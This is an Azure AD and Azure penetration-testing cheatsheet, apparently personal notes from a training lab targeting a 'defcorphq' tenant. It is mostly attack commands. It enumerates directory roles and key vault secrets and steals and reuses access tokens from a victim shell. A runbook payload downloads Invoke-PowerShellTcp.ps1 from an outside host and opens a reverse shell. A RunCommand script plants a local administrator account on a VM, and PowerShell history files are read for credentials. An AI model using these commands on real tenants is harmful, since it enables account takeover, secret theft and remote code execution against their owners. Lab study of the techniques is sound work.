- AzureAD
  - [Users and groups](https://github.com/conma293/Azure/blob/main/cheatsheet.md#users-and-groups)
  - [Preview Module for custom role and policy](https://github.com/conma293/Azure/blob/main/cheatsheet.md#preview-module-for-custom-roles)
- [AZ Powershell](https://github.com/conma293/Azure/blob/main/cheatsheet.md#azure-powershell)
  - [Resources](https://github.com/conma293/Azure/blob/main/cheatsheet.md#resources)
  - [VMS, apps, storage](https://github.com/conma293/Azure/blob/main/cheatsheet.md#vms-apps-storage)
  - [Keyvaults](https://github.com/conma293/Azure/blob/main/cheatsheet.md#keyvault)
  - [Role Assignments](https://github.com/conma293/Azure/blob/main/cheatsheet.md#role-assignments)
  - [Runbooks and Hybrid Worker Groups](https://github.com/conma293/Azure/blob/main/cheatsheet.md#hybrid-worker-groups)
  - [AzContext(similar to logonID sessions)](https://github.com/conma293/Azure/blob/main/cheatsheet.md#azcontext)
  - [NEW USER ENUM]()
- Az CLI
  - [Current user and objects](https://github.com/conma293/Azure/blob/main/cheatsheet.md#current-users-and-objects)
  - [Automation account](https://github.com/conma293/Azure/blob/main/cheatsheet.md#automation-account)
- [Tokens Az Powershell](https://github.com/conma293/Azure/blob/main/cheatsheet.md#token-reuse)
  - [Pivot with tokens (Az CLI to Az Powershell)](https://github.com/conma293/Azure/blob/main/cheatsheet.md#pivot-from-shell-stealing-tokens)
- [Manual APIs and common URLS](https://github.com/conma293/Azure/blob/main/cheatsheet.md#api-call)
  - [URLs](https://github.com/conma293/Azure/blob/main/cheatsheet.md#uris)
- [Scripts](https://github.com/conma293/Azure/blob/main/cheatsheet.md#scripts)
  - [Microburst]
    - [subdomains]
    - [storage blobs]
- Playbooks
  - [Create Runbook](https://github.com/conma293/Azure/blob/main/cheatsheet.md#runbooks)
  - [RunCommand](https://github.com/conma293/Azure/blob/main/cheatsheet.md#runcommand)
  - [Connect to VM](https://github.com/conma293/Azure/blob/main/cheatsheet.md#connect-to-vm)
  - [Powershell History]




# Tools
### AzAD
```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
```

```
$passwd= ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds= New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
```
#### Users and Groups
```
Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com

Get-AzureADGroup -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 | fl *
Get-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7

Get-AzureADUser -SearchString 'admin'
Get-AzureADUser -SearchString 'admin' | Get-AzureADUserMembership

Get-AzureADUserMembership -ObjectId admin@defcorphq.onmicrosoft.com
Get-AzureADUserMembership -ObjectId admin@defcorphq.onmicrosoft.com | select displayname, mail, objecttype

Get-AzureADGroupMember -ObjectId 9240b75e-823c-4c02-8868-a00ddbeb3fa1
Get-AzureADGroupMember -ObjectId 8f7e7d00-12b6-45db-9b84-e221ccab7456
Get-AzureADGroupMember -ObjectId 8f7e7d00-12b6-45db-9b84-e221ccab7456 | select displayname, mail, objecttype

Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```


#### Preview Module for custom roles
```
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
$passwd= ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds= New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
```

```
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```

### MG
```
```
## Azure Powershell
```
Install-Module Az 
```

```
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
```
OR Token:-
```
$AccessToken = 'eyJ0…'
Connect-AzAccount -AccessToken $AccessToken -AccountId <"client_id">
```
#### Resources:
```
Get-AzResource
Get-AzAdUser
Get-AzAdApplication
```

#### VMs, Apps, Storage:
```
Get-AzVM | fl *

Get-AzWebApp
Get-AzWebApp | select name, HostNames, kind, state, identity

Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
Get-AzFunctionApp

Get-AzStorageAccount | fl
```

#### Keyvault
```
Get-AzKeyVault

Get-AzKeyVaultSecret -VaultName ResearchKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```


#### Role Assignments
```
Get-AzRoleAssignment
Get-AzRoleAssignment | select DisplayName, RoleDefinitionName, ObjectType, CanDelegate
```

Pivot on all scope:
```
Get-AzRoleAssignment -Scope </sub/resources/etc>
Get-AzRoleAssignment -Scope </sub/resources/etc> | select RoleDefinitionName, ObjectId, ObjectType
```

Look at specific role:
```
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
```

#### Hybrid Worker Groups
```
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
```

#### AzContext

If you compromise a machine worth checking out azcontext, similar to sessions, if we steal an azcontext with ```select-azcontext``` we may be able to grab all the permissions(_i.e., Role Assignments_) of that context/session. Good to check, similar to rubeus checking cached tickets from LogonID sessions.
```
get-azcontext
select-azcontext -Name <copy pasted>
```

### New Identity ENUM
```
Get-AzResources

Get-AzRoleAssignment
Get-AzRoleAssignment | select DisplayName, RoleDefinitionName, ObjectType, CanDelegate
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"

Get-AzADGroup -DisplayName 'VM Admins' 
Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select DisplayName
```

* * * 

## Az CLI 
```
--query "[].{roleDefinitionName, principalName, scope}" -o table
--query "[].{name: displayName, type: objectType, id: objectId}" --output table
```
#### Current users and objects
```
az ad signed-in-user show

az ad signed-in-user list-owned-objects
az ad signed-in-user list-owned-objects --query "[].{name: displayName, type: objectType, id: objectId}" --output table
```
#### Automation Account
```
az extension add --upgrade -n automation
az automation account list
```
To be able to interact with Azure AD:
- request a token for the ms-graph: ```az account get-access-token --resource-type ms-graph```
- or request a token for the aad-graph: ```az account get-access-token --resource-type aad-graph```
- And request a token for resources (ARM): ```az account get-access-token```
- And then connect: ```Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId <VictimObjectId>```

### Token reuse:
```
Connect-AzAccount -AccessToken $token -AccountId test@defcorphq.onmicrosoft.com

Get-AzAccessToken -ResourceTypeName MSGraph
Disconnect-AzAccount
Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken $token -MicrosoftGraphAccessToken eyJ0eXA...
```

#### Pivot from shell stealing tokens
- On victim shell using Az CLI:
```
az account get-access-token
az account get-access-token --resource-type aad-graph
```

- Open a new Powershell console and use Az Powershell:
```
PS C:\AzAD\Tools> $AccessToken = 'eyJ0…'
PS C:\AzAD\Tools> $AADToken = 'eyJ0…'
```
Now you can connect; ```-AccountID``` is victimID you stole the tokens from:
```
Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
```

# API Call
```
$token=''
OR
$TOKEN=(Get-AzAccessToken).Token
OR
$TOKEN=(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
```

```
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $token"
}
}
(Invoke-RestMethod @RequestParams).value
```

#### URIs
ARM:
```
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$URI = 'https://management.azure.com/subscriptions/<SubID>/resources?api-version=2020-10-01'
$URI = 'https://management.azure.com/subscriptions/<SubID>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
vms
webapp
storage blob
keyvault
```

And Graph:
```
$URI = 'https://graph.microsoft.com/v1.0/users'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$URI = 'https://graph.microsoft.com/v1.0/users/VMContributor213@defcorphq.onmicrosoft.com/memberOf'
Groups
Roles
Devices
Applications
App Registrations
Service Principals
```


## Scripts
#### Subdomains:
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1 
Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
```



#### Storage Blobs:

- We can also add permutations like common, backup, code to ```permutations.txt``` in ```C:\AzAD\Tools\Microburst\Misc``` to tune it for the specific domain we are targetting\
- If the browser doesnt allow you access to the referenced blob try using Azure Storage Explorer GUI!
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1 
Invoke-EnumerateAzureBlobs -Base defcorp
```

## Runbooks

#### Prepare code for runbook
Create script to be executed via runbook, remember to host TCPConnect.ps1:
```
iex (New-Object Net.Webclient).downloadstring("http://172.16.152.213:82/Invoke-PowerShellTcp.ps1")
Power -Reverse -IPAddress 172.16.152.213 -Port 1234
```

#### Create and Execute runbook
```
Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
```
```
Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```
```
Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

## RunCommand

#### Run a script 
Create a script to be used in the runcommand, below is a powershell script to add a user to local administrators group:
```
$passwd = ConvertTo-SecureString "Stud213Password@123" -AsPlainText -Force
New-LocalUser -Name student213 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student213
```
#### RunCommand
Now we can run the script via VMRumCommand:
```
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
```

## Connect to VM
#### Get Public IP
```
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile

Get-AzNetworkInterface -Name bkpadconnect368

Get-AzPublicIpAddress -Name bkpadconnectIP
```

#### Connect to VM
Now we are a user on the VM and we know the publically addressable IP, we can connect directly to it using PS Remoting
```
$password = ConvertTo-SecureString 'Stud213Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student213', $Password) 
$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) 
Enter-PSSession $sess
```
#### Powershell history - credentials
```
cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
